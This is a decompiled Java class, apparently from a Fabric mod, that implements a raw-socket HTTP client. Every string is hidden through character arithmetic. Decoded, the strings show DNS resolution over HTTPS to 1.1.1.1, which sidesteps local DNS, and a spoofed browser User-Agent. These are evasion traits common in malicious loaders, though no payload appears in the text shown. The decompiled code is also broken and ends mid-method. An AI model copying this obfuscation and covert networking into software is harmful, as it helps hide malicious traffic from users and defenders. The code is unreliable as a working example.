/*
 * Decompiled with CFR 0.152.
 */
package net.fabric;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URI;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import javax.net.ssl.SNIHostName;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLParameters;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

public class PAYym8FkkE {
    private static final Map<String, iUmkhj> bJGBjLA3hN = new ConcurrentHashMap<String, iUmkhj>();
    private static SSLSocketFactory si_pr;

    public PAYym8FkkE() {
        PAYym8FkkE RILB;
    }

    public static lasaPiglZwzhFhsvb get(String PSzw_MWeP_uifG_FcBs) throws IOException {
        return PAYym8FkkE.fubHTzCB("GET", PSzw_MWeP_uifG_FcBs, null, null, null);
    }

    public static lasaPiglZwzhFhsvb get(String opiG_bZmi_UEII_iMWQ, Map<String, String> ywurwmTfjFrScdu) throws IOException {
        return PAYym8FkkE.fubHTzCB("GET", opiG_bZmi_UEII_iMWQ, null, null, ywurwmTfjFrScdu);
    }

    public static lasaPiglZwzhFhsvb xBqlwov(String xqwam_tun_bvwdes, String jiapvoNt, String YCeK_afrG_gScX_rWfb) throws IOException {
        int n = 1415329215;
        if ((n & 0x545C35BF) == 1415329215) {
            n = -40260402;
            n <<= 8;
            n >>>= 9;
            int n2 = 125628306;
            n2 <<= 16;
            n2 >>>= 12;
        }
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append((char)(18899 - 18819));
        stringBuilder.append((char)(15713 - 15634));
        stringBuilder.append((char)(61886 - 61803));
        stringBuilder.append((char)(3406 - 3322));
        return PAYym8FkkE.fubHTzCB(stringBuilder.toString(), xqwam_tun_bvwdes, jiapvoNt, YCeK_afrG_gScX_rWfb, null);
    }

    public static lasaPiglZwzhFhsvb atcjqgaZckylgk(String RPZE_WdLp_dePf_toqY, String za_onz_xieibg_mzq, String bfuk_dxov_aa, Map<String, String> ogwTskyc) throws IOException {
        char[] cArray = new char[4];
        cArray[0] = (char)(20397 + 45219);
        cArray[1] = (char)(63466 + 2149);
        if (-8223272686030803387L == -8223272686030803387L) {
            int n = -71615961;
            n <<= 18;
            n >>>= 19;
            long l = 4409137402186028389L;
            l &= 0x17604229D34A742L;
            l |= 0x76074125D5E123A6L;
        }
        cArray[2] = (char)(28384 + 37235);
        cArray[3] = (char)(17939 + 47681);
        return PAYym8FkkE.fubHTzCB(new String(cArray), RPZE_WdLp_dePf_toqY, za_onz_xieibg_mzq, bfuk_dxov_aa, ogwTskyc);
    }

    public static lasaPiglZwzhFhsvb put(String ydakdtVfknpQbhsl, String res2, String flrTzjwqa, Map<String, String> emtDzhoknWlwGj) throws IOException {
        return PAYym8FkkE.fubHTzCB("PUT", ydakdtVfknpQbhsl, res2, flrTzjwqa, emtDzhoknWlwGj);
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    public static lasaPiglZwzhFhsvb fubHTzCB(String elem4, String QR_s_bB_cDTJ, String temp1, String e6jaxGv, Map<String, String> dspiql_ddfdav) throws IOException {
        Socket kacc;
        String posTmp;
        URL iyglnClifgQndXu = URI.create(QR_s_bB_cDTJ).toURL();
        String ongxJwdbvNucxCxlviw = iyglnClifgQndXu.getHost();
        int ilxuh_lqmsxt_vkptx = iyglnClifgQndXu.getPort();
        String string = iyglnClifgQndXu.getProtocol();
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append((char)(12831 - 12727));
        stringBuilder.append((char)(60874 - 60758));
        stringBuilder.append((char)(22089 - 21973));
        stringBuilder.append((char)(20249 - 20137));
        stringBuilder.append((char)(28383 - 28268));
        boolean qQdD_DmCG_UchT_UFcP = string.equalsIgnoreCase(stringBuilder.toString());
        if (ilxuh_lqmsxt_vkptx == -1) {
            int n = ilxuh_lqmsxt_vkptx = qQdD_DmCG_UchT_UFcP ? 443 : 80;
        }
        if ((posTmp = iyglnClifgQndXu.getPath()) == null || posTmp.isEmpty()) {
            posTmp = "/";
        }
        if (iyglnClifgQndXu.getQuery() != null) {
            String string2 = iyglnClifgQndXu.getQuery();
            String string3 = posTmp;
            posTmp = string3 + "?" + string2;
        }
        String kInfo = PAYym8FkkE.kcTymrwtqHbsoebiAoge(ongxJwdbvNucxCxlviw);
        Socket uygU_wdTh_WLtS_CfDp = new Socket();
        uygU_wdTh_WLtS_CfDp.setReceiveBufferSize(524288);
        uygU_wdTh_WLtS_CfDp.connect(new InetSocketAddress(kInfo, ilxuh_lqmsxt_vkptx), 10000);
        uygU_wdTh_WLtS_CfDp.setSoTimeout(30000);
        if (qQdD_DmCG_UchT_UFcP) {
            SSLSocket sourceItem = (SSLSocket)si_pr.createSocket(uygU_wdTh_WLtS_CfDp, ongxJwdbvNucxCxlviw, ilxuh_lqmsxt_vkptx, true);
            SSLParameters d9VdN = sourceItem.getSSLParameters();
            d9VdN.setServerNames(List.of(new SNIHostName(ongxJwdbvNucxCxlviw)));
            char[] cArray = new char[]{(char)(0xDF85 ^ 0xDFCD), (char)(0x289 ^ 0x2DD), (char)(0x33D ^ 0x369), (char)(0x36F8 ^ 0x36A8), (char)(0x84AC ^ 0x84FF)};
            d9VdN.setEndpointIdentificationAlgorithm(new String(cArray));
            sourceItem.setSSLParameters(d9VdN);
            sourceItem.startHandshake();
            SSLSocket bxsuozKupolp = sourceItem;
        } else {
            kacc = uygU_wdTh_WLtS_CfDp;
        }
        try {
            OutputStream kcbvolKveraf = kacc.getOutputStream();
            InputStream zfcNhNkzjRrbyv = kacc.getInputStream();
            StringBuilder mout = new StringBuilder();
            StringBuilder stringBuilder2 = mout.append(elem4).append(" ").append(posTmp);
            StringBuilder stringBuilder3 = new StringBuilder();
            stringBuilder3.append((char)(0x9852 ^ 0x9872));
            stringBuilder3.append((char)(0x7087 ^ 0x70CF));
            stringBuilder3.append((char)(0xFE42 ^ 0xFE16));
            stringBuilder3.append((char)(0x96BA ^ 0x96EE));
            stringBuilder3.append((char)(0x9822 ^ 0x9872));
            stringBuilder3.append((char)(0x70E0 ^ 0x70CF));
            stringBuilder3.append((char)(0xFE27 ^ 0xFE16));
            stringBuilder3.append((char)(0x96C0 ^ 0x96EE));
            stringBuilder3.append((char)(0x9843 ^ 0x9872));
            stringBuilder3.append((char)(0x70C2 ^ 0x70CF));
            stringBuilder3.append((char)(0xFE1C ^ 0xFE16));
            stringBuilder2.append(stringBuilder3.toString());
            char[] cArray = new char[]{(char)(0x720 ^ 0x768), (char)(0x5A3F ^ 0x5A50), (char)(0xF031 ^ 0xF042), (char)(0x4E33 ^ 0x4E47), (char)(0x4025 ^ 0x401F), (char)(0xDDD0 ^ 0xDDF0)};
            mout.append(new String(cArray)).append(ongxJwdbvNucxCxlviw);
            if (qQdD_DmCG_UchT_UFcP && ilxuh_lqmsxt_vkptx != 443 || !qQdD_DmCG_UchT_UFcP && ilxuh_lqmsxt_vkptx != 80) {
                mout.append(":").append(ilxuh_lqmsxt_vkptx);
            }
            mout.append("\r\n");
            char[] cArray2 = new char[]{(char)(17185 - 17118), (char)(35482 - 35371), (char)(2348 - 2238), (char)(6529 - 6419), (char)(52306 - 52205), (char)(11124 - 11025), (char)(25172 - 25056), (char)(44971 - 44866), (char)(54082 - 53971), (char)(17228 - 17118), (char)(35429 - 35371), (char)(2270 - 2238), (char)(6518 - 6419), (char)(52313 - 52205), (char)(11136 - 11025), (char)(25171 - 25056), (char)(44967 - 44866), (char)(53984 - 53971), (char)(17128 - 17118)};
            mout.append(new String(cArray2));
            boolean stateRef = false;
            boolean deuu_Ns9ivyt = false;
            if (dspiql_ddfdav != null) {
                for (Map.Entry<String, String> m5_sTbJn : dspiql_ddfdav.entrySet()) {
                    char[] cArray3;
                    String gNKq_xcPW_bZQy_uDFw = m5_sTbJn.getKey();
                    StringBuilder stringBuilder4 = new StringBuilder();
                    stringBuilder4.append((char)(0xA135 ^ 0xA17D));
                    stringBuilder4.append((char)(0x33ED ^ 0x3382));
                    stringBuilder4.append((char)(0x5C80 ^ 0x5CF3));
                    stringBuilder4.append((char)(0x6953 ^ 0x6927));
                    if (gNKq_xcPW_bZQy_uDFw.equalsIgnoreCase(stringBuilder4.toString())) continue;
                    char[] cArray4 = new char[]{(char)(59126 - 59059), (char)(9140 - 9029), (char)(35425 - 35315), (char)(17350 - 17240), (char)(55106 - 55005), (char)(2064 - 1965), (char)(57981 - 57865), (char)(55189 - 55084), (char)(58878 - 58767), (char)(62555 - 62445)};
                    if (gNKq_xcPW_bZQy_uDFw.equalsIgnoreCase(new String(cArray4))) continue;
                    char[] cArray5 = new char[]{(char)(0xED1E ^ 0xED5D), (char)(0x1AD5 ^ 0x1ABA), (char)(0xDDC8 ^ 0xDDA6), (char)(0xDC75 ^ 0xDC01), (char)(0xFDD3 ^ 0xFDB6), (char)(0xED33 ^ 0xED5D), (char)(0x1ACE ^ 0x1ABA), (char)(0xDD8B ^ 0xDDA6), (char)(0xDC4D ^ 0xDC01), (char)(0xFDD3 ^ 0xFDB6), (char)(0xED33 ^ 0xED5D), (char)(0x1ADD ^ 0x1ABA), (char)(0xDDD2 ^ 0xDDA6), (char)(0xDC69 ^ 0xDC01)};
                    if (gNKq_xcPW_bZQy_uDFw.equalsIgnoreCase(new String(cArray5))) continue;
                    StringBuilder stringBuilder5 = new StringBuilder();
                    stringBuilder5.append((char)(43060 - 42995));
                    stringBuilder5.append((char)(509 - 410));
                    stringBuilder5.append((char)(13651 - 13552));
                    stringBuilder5.append((char)(1425 - 1324));
                    stringBuilder5.append((char)(63927 - 63815));
                    stringBuilder5.append((char)(61338 - 61222));
                    if (gNKq_xcPW_bZQy_uDFw.equalsIgnoreCase(stringBuilder5.toString())) {
                        stateRef = true;
                    }
                    if (gNKq_xcPW_bZQy_uDFw.equalsIgnoreCase(new String(cArray3 = new char[]{(char)(0xF0A0 ^ 0xF0F5), (char)(0xD88F ^ 0xD8FC), (char)(0xF1F8 ^ 0xF19D), (char)(0xAE8F ^ 0xAEFD), (char)(0xE617 ^ 0xE63A), (char)(0xF889 ^ 0xF8C8), (char)(0xF301 ^ 0xF366), (char)(0x5842 ^ 0x5827), (char)(0x7DE5 ^ 0x7D8B), (char)(0x2643 ^ 0x2637)}))) {
                        deuu_Ns9ivyt = true;
                    }
                    mout.append(gNKq_xcPW_bZQy_uDFw).append(": ").append(m5_sTbJn.getValue()).append("\r\n");
                }
            }
            if (!stateRef) {
                StringBuilder stringBuilder6 = new StringBuilder();
                stringBuilder6.append((char)(0x3971 ^ 0x3930));
                stringBuilder6.append((char)(0x3ABF ^ 0x3ADC));
                stringBuilder6.append((char)(0xF23A ^ 0xF259));
                stringBuilder6.append((char)(0xCB78 ^ 0xCB1D));
                stringBuilder6.append((char)(0x783D ^ 0x784D));
                stringBuilder6.append((char)(0xE26B ^ 0xE21F));
                stringBuilder6.append((char)(0x9E05 ^ 0x9E3F));
                stringBuilder6.append((char)(0x6DC8 ^ 0x6DE8));
                stringBuilder6.append((char)(0xAD3E ^ 0xAD14));
                stringBuilder6.append((char)(0x391F ^ 0x3930));
                stringBuilder6.append((char)(0x3AF6 ^ 0x3ADC));
                stringBuilder6.append((char)(0xF254 ^ 0xF259));
                stringBuilder6.append((char)(0xCB17 ^ 0xCB1D));
                mout.append(stringBuilder6.toString());
            }
            if (!deuu_Ns9ivyt) {
                StringBuilder stringBuilder7 = new StringBuilder();
                char[] cArray6 = new char[]{(char)(0x48B ^ 0x4DE), (char)(0x1F0A ^ 0x1F79), (char)(0xF548 ^ 0xF52D), (char)(0xE13E ^ 0xE14C), (char)(0x8C69 ^ 0x8C44), (char)(0x482D ^ 0x486C), (char)(0x4B9 ^ 0x4DE), (char)(0x1F1C ^ 0x1F79), (char)(0xF543 ^ 0xF52D), (char)(0xE138 ^ 0xE14C), (char)(0x8C7E ^ 0x8C44)};
                stringBuilder7.append(new String(cArray6));
                char[] cArray7 = new char[]{(char)(58118 - 58086), (char)(29361 - 29284), (char)(56067 - 55956), (char)(61275 - 61153), (char)(17333 - 17228), (char)(6670 - 6562), (char)(65039 - 64931), (char)(9086 - 8989), (char)(58889 - 58842), (char)(43322 - 43269)};
                stringBuilder7.append(new String(cArray7));
                StringBuilder stringBuilder8 = new StringBuilder();
                stringBuilder8.append((char)(2522 - 2476));
                stringBuilder8.append((char)(57506 - 57458));
                stringBuilder8.append((char)(29522 - 29490));
                stringBuilder8.append((char)(51040 - 51000));
                stringBuilder8.append((char)(59747 - 59660));
                stringBuilder8.append((char)(59336 - 59231));
                stringBuilder8.append((char)(57077 - 56967));
                stringBuilder8.append((char)(1541 - 1441));
                stringBuilder7.append(stringBuilder8.toString());
                char[] cArray8 = new char[]{(char)(45449 - 45338), (char)(25635 - 25516), (char)(36186 - 36071), (char)(48056 - 48024), (char)(21293 - 21215), (char)(17638 - 17554), (char)(7122 - 7090), (char)(58038 - 57989), (char)(59658 - 59610), (char)(19081 - 19035), (char)(59632 - 59584)};
                stringBuilder7.append(new String(cArray8));
                char[] cArray9 = new char[]{(char)(11602 - 11543), (char)(62896 - 62864), (char)(58623 - 58536), (char)(36071 - 35966), (char)(60130 - 60020), (char)(5442 - 5388), (char)(51276 - 51224), (char)(18172 - 18113), (char)(16778 - 16746), (char)(23679 - 23559), (char)(32140 - 32086), (char)(3657 - 3605), (char)(11584 - 11543), (char)(62896 - 62864), (char)(58601 - 58536)};
                stringBuilder7.append(new String(cArray9));
                char[] cArray10 = new char[]{(char)(33502 - 33390), (char)(62849 - 62737), (char)(58211 - 58103), (char)(49225 - 49124), (char)(989 - 902), (char)(26861 - 26760), (char)(50171 - 50073), (char)(56314 - 56239), (char)(7113 - 7008), (char)(1367 - 1251), (char)(55451 - 55404), (char)(59869 - 59816), (char)(33441 - 33390), (char)(62792 - 62737), (char)(58149 - 58103), (char)(49175 - 49124), (char)(956 - 902), (char)(26773 - 26760), (char)(50083 - 50073)};
                stringBuilder7.append(new String(cArray10));
                mout.append(stringBuilder7.toString());
            }
            byte[] retSum = null;
            if (temp1 != null) {
                retSum = temp1.getBytes(StandardCharsets.UTF_8);
                if (e6jaxGv != null) {
                    StringBuilder stringBuilder9 = new StringBuilder();
                    stringBuilder9.append((char)(5316 - 5249));
                    stringBuilder9.append((char)(40319 - 40208));
                    stringBuilder9.append((char)(29368 - 29258));
                    stringBuilder9.append((char)(31812 - 31696));
                    stringBuilder9.append((char)(7595 - 7494));
                    stringBuilder9.append((char)(10838 - 10728));
                    stringBuilder9.append((char)(38331 - 38215));
                    stringBuilder9.append((char)(5294 - 5249));
                    stringBuilder9.append((char)(40292 - 40208));
                    stringBuilder9.append((char)(29379 - 29258));
                    stringBuilder9.append((char)(31808 - 31696));
                    stringBuilder9.append((char)(7595 - 7494));
                    stringBuilder9.append((char)(10786 - 10728));
                    stringBuilder9.append((char)(38247 - 38215));
                    mout.append(stringBuilder9.toString()).append(e6jaxGv).append("\r\n");
                }
                char[] cArray11 = new char[]{(char)(34727 - 34660), (char)(20790 - 20679), (char)(43845 - 43735), (char)(32111 - 31995), (char)(64802 - 64701), (char)(15647 - 15537), (char)(61692 - 61576), (char)(59156 - 59111), (char)(3964 - 3888), (char)(28318 - 28217), (char)(58061 - 57951), (char)(34763 - 34660), (char)(20795 - 20679), (char)(43839 - 43735), (char)(32053 - 31995), (char)(64733 - 64701)};
                mout.append(new String(cArray11)).append(retSum.length).append("\r\n");
            }
            mout.append("\r\n");
            kcbvolKveraf.write(mout.toString().getBytes(StandardCharsets.ISO_8859_1));
            if (retSum != null) {
                kcbvolKveraf.write(retSum);
            }
            kcbvolKveraf.flush();
            lasaPiglZwzhFhsvb lasaPiglZwzhFhsvb2 = PAYym8FkkE.ptrTgdufkh(zfcNhNkzjRrbyv);
            return lasaPiglZwzhFhsvb2;
        }
        finally {
            kacc.close();
        }
    }

    private static lasaPiglZwzhFhsvb ptrTgdufkh(InputStream wj_nmcmhu) throws IOException {
        byte[] ifau_BThk_YXnc_thuX;
        int zbBtPalmrz;
        String PWtN_tNZW_mLch_EmUo;
        String[] KGfz_KFPZ_cUIF_MmAc;
        int sC3Lq0vjV;
        BufferedInputStream config3 = new BufferedInputStream(wj_nmcmhu);
        ByteArrayOutputStream danlbChk = new ByteArrayOutputStream();
        int sizePos = -1;
        while ((sC3Lq0vjV = config3.read()) != -1) {
            danlbChk.write(sC3Lq0vjV);
            if (sizePos == 13 && sC3Lq0vjV == 10) {
                int oihlIemtuoGemXnkcp = danlbChk.size();
                byte[] e5u_Sq_Ez8o = danlbChk.toByteArray();
                if (oihlIemtuoGemXnkcp >= 4 && e5u_Sq_Ez8o[oihlIemtuoGemXnkcp - 4] == 13 && e5u_Sq_Ez8o[oihlIemtuoGemXnkcp - 3] == 10) break;
            }
            sizePos = sC3Lq0vjV;
        }
        String x4FKB = (KGfz_KFPZ_cUIF_MmAc = (PWtN_tNZW_mLch_EmUo = danlbChk.toString(StandardCharsets.ISO_8859_1)).split("\r\n")).length > 0 ? KGfz_KFPZ_cUIF_MmAc[0] : "";
        int bXDqz = 0;
        char[] cArray = new char[]{(char)(0x544A ^ 0x5402), (char)(0xE486 ^ 0xE4D2), (char)(0x753F ^ 0x756B), (char)(0x2FBF ^ 0x2FEF), (char)(0x9FC4 ^ 0x9FEB)};
        if (x4FKB.startsWith(new String(cArray)) && (zbBtPalmrz = x4FKB.indexOf(32)) > 0) {
            int lkvhwgLf = x4FKB.indexOf(32, zbBtPalmrz + 1);
            String headData = lkvhwgLf > 0 ? x4FKB.substring(zbBtPalmrz + 1, lkvhwgLf) : x4FKB.substring(zbBtPalmrz + 1);
            try {
                bXDqz = Integer.parseInt(headData.trim());
            }
            catch (NumberFormatException numberFormatException) {
                // empty catch block
            }
        }
        LinkedHashMap<String, String> el_wzcya_czg_uev = new LinkedHashMap<String, String>();
        int Z9ZBf45j6_oh = -1;
        boolean tailSum = false;
        for (int uryg_mtacri_atle = 1; uryg_mtacri_atle < KGfz_KFPZ_cUIF_MmAc.length; ++uryg_mtacri_atle) {
            String e2 = KGfz_KFPZ_cUIF_MmAc[uryg_mtacri_atle];
            int pj_txgegl_salbw = e2.indexOf(58);
            if (pj_txgegl_salbw <= 0) continue;
            String stateAvg = e2.substring(0, pj_txgegl_salbw).trim().toLowerCase();
            String ijClOdci = e2.substring(pj_txgegl_salbw + 1).trim();
            el_wzcya_czg_uev.put(stateAvg, ijClOdci);
            char[] cArray2 = new char[]{(char)(8153 + 57482), (char)(38097 + 27550), (char)(63825 + 1821), (char)(9523 + 56129), (char)(25404 + 40233), (char)(59872 + 5774), (char)(30127 + 35525), (char)(32129 + 33452), (char)(53122 + 12522), (char)(12896 + 52741), (char)(64358 + 1288), (char)(8157 + 57482), (char)(38102 + 27550), (char)(63819 + 1821)};
            if (stateAvg.equals(new String(cArray2))) {
                try {
                    Z9ZBf45j6_oh = Integer.parseInt(ijClOdci);
                }
                catch (NumberFormatException numberFormatException) {}
                continue;
            }
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append((char)(24660 - 24544));
            stringBuilder.append((char)(48593 - 48479));
            stringBuilder.append((char)(12854 - 12757));
            stringBuilder.append((char)(43681 - 43571));
            stringBuilder.append((char)(24659 - 24544));
            stringBuilder.append((char)(48581 - 48479));
            stringBuilder.append((char)(12858 - 12757));
            stringBuilder.append((char)(43685 - 43571));
            stringBuilder.append((char)(24589 - 24544));
            stringBuilder.append((char)(48580 - 48479));
            stringBuilder.append((char)(12867 - 12757));
            stringBuilder.append((char)(43670 - 43571));
            stringBuilder.append((char)(24655 - 24544));
            stringBuilder.append((char)(48579 - 48479));
            stringBuilder.append((char)(12862 - 12757));
            stringBuilder.append((char)(43681 - 43571));
            stringBuilder.append((char)(24647 - 24544));
            if (!stateAvg.equals(stringBuilder.toString())) continue;
            String string = ijClOdci.toLowerCase();
            StringBuilder stringBuilder2 = new StringBuilder();
            stringBuilder2.append((char)(0xAD3F ^ 0xAD5C));
            stringBuilder2.append((char)(0x53E4 ^ 0x538C));
            stringBuilder2.append((char)(0x2742 ^ 0x2737));
            stringBuilder2.append((char)(0x6D0 ^ 0x6BE));
            stringBuilder2.append((char)(0xAC81 ^ 0xACEA));
            stringBuilder2.append((char)(0x3B8E ^ 0x3BEB));
            stringBuilder2.append((char)(0xC101 ^ 0xC165));
            if (!string.contains(stringBuilder2.toString())) continue;
            tailSum = true;
        }
        if (tailSum) {
            byte[] capInfo = PAYym8FkkE.PfdRMHGyJLWAEIr(config3);
        } else if (Z9ZBf45j6_oh >= 0) {
            int param;
            byte[] uZZw_rewo_KPei_QBEg = new byte[Z9ZBf45j6_oh];
            for (int vLfW___z_7NDg4 = 0; vLfW___z_7NDg4 < Z9ZBf45j6_oh && (param = config3.read(uZZw_rewo_KPei_QBEg, vLfW___z_7NDg4, Z9ZBf45j6_oh - vLfW___z_7NDg4)) != -1; vLfW___z_7NDg4 += param) {
            }
        } else {
            int BCPK_xcha_dsKM_OZTK;
            ByteArrayOutputStream urZqqoyLnxe = new ByteArrayOutputStream(0x100000);
            byte[] len3 = new byte[131072];
            while ((BCPK_xcha_dsKM_OZTK = config3.read(len3)) != -1) {
                urZqqoyLnxe.write(len3, 0, BCPK_xcha_dsKM_OZTK);
            }
            ifau_BThk_YXnc_thuX = urZqqoyLnxe.toByteArray();
        }
        return new lasaPiglZwzhFhsvb(bXDqz, x4FKB, el_wzcya_czg_uev, ifau_BThk_YXnc_thuX);
    }

    private static byte[] PfdRMHGyJLWAEIr(InputStream bimtpTjw) throws IOException {
        ByteArrayOutputStream pnynBassty = new ByteArrayOutputStream(0x100000);
        StringBuilder lls4J__ne = new StringBuilder();
        while (true) {
            int hnzyuHdMtu;
            int strNum;
            int keyPos;
            String duaka_ilpump_vfkuuj;
            int offsetIn;
            int zexjcQawb;
            lls4J__ne.setLength(0);
            while ((zexjcQawb = bimtpTjw.read()) != -1 && zexjcQawb != 13) {
                lls4J__ne.append((char)zexjcQawb);
            }
            if (zexjcQawb == 13) {
                bimtpTjw.read();
            }
            if ((offsetIn = (duaka_ilpump_vfkuuj = lls4J__ne.toString()).indexOf(59)) >= 0) {
                duaka_ilpump_vfkuuj = duaka_ilpump_vfkuuj.substring(0, offsetIn);
            }
            if (duaka_ilpump_vfkuuj.isEmpty() || (keyPos = Integer.parseInt(duaka_ilpump_vfkuuj.trim(), 16)) == 0) break;
            byte[] kc_rpf = new byte[keyPos];
            for (hnzyuHdMtu = 0; hnzyuHdMtu < keyPos && (strNum = bimtpTjw.read(kc_rpf, hnzyuHdMtu, keyPos - hnzyuHdMtu)) != -1; hnzyuHdMtu += strNum) {
            }
            pnynBassty.write(kc_rpf, 0, hnzyuHdMtu);
            bimtpTjw.read();
            bimtpTjw.read();
        }
        return pnynBassty.toByteArray();
    }

    public static String kcTymrwtqHbsoebiAoge(String nBgH_wPMY_EcnF_qPOD) throws IOException {
        if (PAYym8FkkE.vdlwsvk(nBgH_wPMY_EcnF_qPOD)) {
            return nBgH_wPMY_EcnF_qPOD;
        }
        iUmkhj rHOt_HbiB_SEEB_KUWI = bJGBjLA3hN.get(nBgH_wPMY_EcnF_qPOD);
        if (rHOt_HbiB_SEEB_KUWI != null && !rHOt_HbiB_SEEB_KUWI.isExpired()) {
            return rHOt_HbiB_SEEB_KUWI.ip;
        }
        byte[] ZbDQ_zyMp_YkpC_TGZf = PAYym8FkkE.RMfvpPmL_AA(nBgH_wPMY_EcnF_qPOD);
        byte[] valueAvg = PAYym8FkkE.sRzzrCo(ZbDQ_zyMp_YkpC_TGZf);
        String uccOigWthptJjos = PAYym8FkkE.xfykOypUwdPb(valueAvg);
        if (uccOigWthptJjos != null) {
            bJGBjLA3hN.put(nBgH_wPMY_EcnF_qPOD, new iUmkhj(uccOigWthptJjos, System.currentTimeMillis() + 300000L));
        }
        return uccOigWthptJjos;
    }

    private static boolean vdlwsvk(String qraeHpwpf) {
        if (qraeHpwpf == null || qraeHpwpf.isEmpty()) {
            return false;
        }
        for (int opts = 0; opts < qraeHpwpf.length(); ++opts) {
            char bPtr = qraeHpwpf.charAt(opts);
            if (bPtr == '.' || bPtr >= '0' && bPtr <= '9') continue;
            return false;
        }
        return qraeHpwpf.contains(".");
    }

    private static byte[] RMfvpPmL_AA(String gqqjqb_wcgar) {
        ByteArrayOutputStream tailTmp = new ByteArrayOutputStream();
        DataOutputStream ze_iu = new DataOutputStream(tailTmp);
        try {
            short okYukill = (short)(System.nanoTime() & 0xFFFFL);
            ze_iu.writeShort(okYukill);
            ze_iu.writeShort(256);
            ze_iu.writeShort(1);
            ze_iu.writeShort(0);
            ze_iu.writeShort(0);
            ze_iu.writeShort(0);
            for (String D_f2_1bBhd_R : gqqjqb_wcgar.split("\\.")) {
                ze_iu.writeByte(D_f2_1bBhd_R.length());
                ze_iu.writeBytes(D_f2_1bBhd_R);
            }
            ze_iu.writeByte(0);
            ze_iu.writeShort(1);
            ze_iu.writeShort(1);
        }
        catch (IOException pLSn04_MMd) {
            throw new RuntimeException(pLSn04_MMd);
        }
        return tailTmp.toByteArray();
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    private static byte[] sRzzrCo(byte[] mgWwsq) throws IOException {
        Socket aecu_nojkvc = new Socket();
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append((char)(0x20E6 ^ 0x20D7));
        stringBuilder.append((char)(0x8090 ^ 0x80BE));
        stringBuilder.append((char)(0x9D7 ^ 0x9E6));
        stringBuilder.append((char)(0x9581 ^ 0x95AF));
        stringBuilder.append((char)(0xD7F9 ^ 0xD7C8));
        stringBuilder.append((char)(0xE810 ^ 0xE83E));
        stringBuilder.append((char)(0xF6FC ^ 0xF6CD));
        aecu_nojkvc.connect(new InetSocketAddress(stringBuilder.toString(), 443), 10000);
        aecu_nojkvc.setSoTimeout(30000);
        char[] cArray = new char[]{(char)(38246 + 27389), (char)(60105 + 5539), (char)(58071 + 7576), (char)(31679 + 33974), (char)(7778 + 57858), (char)(48172 + 17466), (char)(9627 + 56017), (char)(53600 + 12033), (char)(6628 + 59022), (char)(17817 + 47820), (char)(31702 + 33879), (char)(57015 + 8621), (char)(38257 + 27389), (char)(60112 + 5539), (char)(58006 + 7576), (char)(31661 + 33974), (char)(7789 + 57858), (char)(48179 + 17466)};
        SSLSocket kStr = (SSLSocket)si_pr.createSocket(aecu_nojkvc, new String(cArray), 443, true);
        SSLParameters EYZe_oRXu_qTpW_KCEh = kStr.getSSLParameters();
        char[] cArray2 = new char[]{(char)(2364 + 63271), (char)(56660 + 8984), (char)(36555 + 29092), (char)(52084 + 13569), (char)(25091 + 40545), (char)(48220 + 17418), (char)(7021 + 58623), (char)(13036 + 52597), (char)(56778 + 8872), (char)(1072 + 64565), (char)(10672 + 54909), (char)(17418 + 48218), (char)(2375 + 63271), (char)(56667 + 8984), (char)(36490 + 29092), (char)(52066 + 13569), (char)(25102 + 40545), (char)(48227 + 17418)};
        EYZe_oRXu_qTpW_KCEh.setServerNames(List.of(new SNIHostName(new String(cArray2))));
        kStr.setSSLParameters(EYZe_oRXu_qTpW_KCEh);
        kStr.startHandshake();
        try {
            OutputStream cimGvmbNdozfVem = kStr.getOutputStream();
            InputStream optsLen = kStr.getInputStream();
            String wvmah_vk = Base64.getUrlEncoder().withoutPadding().encodeToString(mgWwsq);
            StringBuilder xuwqvk_znyacb_fqaajs = new StringBuilder();
            StringBuilder stringBuilder2 = new StringBuilder();
            stringBuilder2.append((char)(45942 - 45871));
            stringBuilder2.append((char)(4670 - 4601));
            stringBuilder2.append((char)(5234 - 5150));
            stringBuilder2.append((char)(22884 - 22852));
            stringBuilder2.append((char)(65285 - 65238));
            stringBuilder2.append((char)(15825 - 15725));
            stringBuilder2.append((char)(52846 - 52736));
            stringBuilder2.append((char)(49696 - 49581));
            stringBuilder2.append((char)(20667 - 20622));
            stringBuilder2.append((char)(17403 - 17290));
            stringBuilder2.append((char)(48946 - 48829));
            stringBuilder2.append((char)(42925 - 42824));
            stringBuilder2.append((char)(30495 - 30381));
            stringBuilder2.append((char)(45992 - 45871));
            stringBuilder2.append((char)(4664 - 4601));
            stringBuilder2.append((char)(5250 - 5150));
            stringBuilder2.append((char)(22962 - 22852));
            stringBuilder2.append((char)(65353 - 65238));
            stringBuilder2.append((char)(15786 - 15725));
            char[] cArray3 = new char[]{(char)(32675 - 32643), (char)(57932 - 57860), (char)(36883 - 36799), (char)(33383 - 33299), (char)(62133 - 62053), (char)(57357 - 57310), (char)(47708 - 47659), (char)(32689 - 32643), (char)(57909 - 57860), (char)(36812 - 36799), (char)(33309 - 33299)};
            xuwqvk_znyacb_fqaajs.append(stringBuilder2.toString()).append(wvmah_vk).append(new String(cArray3));
            StringBuilder stringBuilder3 = new StringBuilder();
            StringBuilder stringBuilder4 = new StringBuilder();
            stringBuilder4.append((char)(25986 - 25914));
            stringBuilder4.append((char)(47521 - 47410));
            stringBuilder4.append((char)(24725 - 24610));
            stringBuilder4.append((char)(37293 - 37177));
            stringBuilder4.append((char)(25972 - 25914));
            stringBuilder4.append((char)(47442 - 47410));
            stringBuilder4.append((char)(24709 - 24610));
            stringBuilder4.append((char)(37285 - 37177));
            stringBuilder4.append((char)(26025 - 25914));
            stringBuilder4.append((char)(47527 - 47410));
            stringBuilder4.append((char)(24710 - 24610));
            stringBuilder4.append((char)(37279 - 37177));
